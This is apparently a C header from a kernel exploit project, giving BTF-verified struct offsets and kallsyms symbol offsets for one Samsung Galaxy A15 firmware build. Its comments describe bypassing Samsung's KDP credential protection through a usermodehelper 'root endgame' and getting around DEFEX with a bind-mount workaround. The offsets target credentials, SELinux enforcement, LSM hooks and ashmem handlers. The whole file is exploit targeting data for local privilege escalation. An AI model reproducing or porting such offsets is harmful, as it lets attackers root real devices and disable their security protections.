/* Samsung Galaxy A15 (SM-A156U) — A156USQSCEZG1, kernel 5.15.189-android13-8.
 * All symbol offsets are _text-relative, recovered from the A156U firmware
 * Image kallsyms (122,567 symbols, independently verified). Struct field
 * offsets are BTF-verified against this exact build's kernel.btf.
 *
 * KDP PRESENT (CONFIG_KDP=y, CONFIG_KDP_CRED=y): the cred-write endgame is
 * dead on this target. The wq_umh_root endgame is required.
 * DEFEX PRESENT: UMH helper needs the bind-mount workaround.
 */

/* task_struct field offsets — 5.15.189-android13-8 (BTF-verified).
 * EVERY field must be populated: any field left 0 silently falls back to
 * the 6.12 values in runtime_struct_offsets.h, which would corrupt the port. */
#define STRUCT_OFFSETS_5_15 \
  .task_prio=0x7c, .task_normal_prio=0x84, .task_sched_task_group=0x400, \
  .task_pi_lock=0x884, .task_pi_waiters=0x898, \
  .task_pi_top_task=0x8a8, .task_pi_blocked_on=0x8b0, \
  .task_pid=0x5d8, .task_tgid=0x5dc, .task_real_parent=0x5e8, \
  .task_atomic_flags=0x598, .task_real_cred=0x790, .task_cred=0x798, \
  .task_comm=0x7a8, .task_tasks=0x4d0, .task_seccomp=0x860, \
  .mm_owner=0x0

/* Samsung Galaxy A15 — A156USQSCEZG1, kernel 5.15.189-android13-8-33641424 */
OFFSETS_ENTRY("5.15.189-android13-8-33641424",
  .kernel_phys_load=0x40000000, STRUCT_OFFSETS_5_15,
  .off_init_task=0x02A49080, .off_init_cred=0x02040EA0,
  .off_init_uts_ns=0x02A4A468, .off_empty_zero_page=0x02AF5000,
  .off_root_task_group=0x02AF9AC0, .off_selinux_enforcing=0x02BCDED8,
  .off_kptr_restrict=0x028DDB24, .off_selinux_blob_sizes=0x01F15220,
  .off_security_hook_heads=0x01F15250, .off_kmalloc_caches=0x01F1E6C8,
  .off_anon_pipe_buf_ops=0x01D5E260, .off_ashmem_misc_fops=0x02A40EA8,
  .off_ashmem_fops=0x01EC7820, .off_ashmem_ioctl=0x001059670,
  .off_ashmem_compat_ioctl=0x0, .off_ashmem_mmap=0x001059D24,
  .off_ashmem_open=0x00105A004, .off_ashmem_release=0x00105A09C,
  .off_ashmem_show_fdinfo=0x00105A1B8,
  .off_configfs_read_iter=0x005D22A8, .off_configfs_bin_write_iter=0x005D2CD0,
  .off_copy_splice_read=0x0, .off_noop_llseek=0x004BA3E8,
  .off_cap_capable_active=0x0,
  .off_slide_nfulnl_logger=0x028E1E28, .off_slide_loggers_0_1=0x028E1D50,
  .off_slide_boot_id=0x02CAFAA1,
  .off_system_unbound_wq=0x028E07D8, .off_call_usermodehelper_exec_work=0x00104598,
),
